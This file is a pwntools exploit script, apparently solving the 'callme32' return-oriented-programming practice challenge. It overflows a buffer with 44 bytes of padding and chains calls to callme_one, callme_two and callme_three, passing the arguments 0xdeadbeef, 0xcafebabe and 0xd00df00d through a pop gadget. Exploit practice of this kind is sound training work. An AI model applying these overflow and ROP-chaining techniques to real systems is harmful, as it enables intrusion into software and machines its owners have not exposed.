#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('callme32')
context.log_level = 'DEBUG'


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --
pop = p32(0x080487f9)
arg = b''.join([p32(_) for _ in [0xdeadbeef, 0xcafebabe, 0xd00df00d]])


OFFSET = 44
pop = p32(0x080484aa)

payload = b'\x41' * 44
payload += p32(exe.sym.plt.callme_one)
payload += pop
payload += arg
payload += p32(exe.sym.plt.callme_two)
payload += pop
payload += arg
payload += p32(exe.sym.plt.callme_three)
payload += pop
payload += arg

# r = ROP(exe)
# r.call(exe.sym.plt.callme_one, arg)
# r.call(exe.sym.plt.callme_two, [0xdeadbeef, 0xcafebabe, 0xd00df00d])
# r.call(exe.sym.plt.callme_three, [0xdeadbeef, 0xcafebabe, 0xd00df00d])

# info(r.dump())
# payload = fit({OFFSET: r.chain()})
info(payload)
io = start()

io.sendline(payload)
io.recvall()
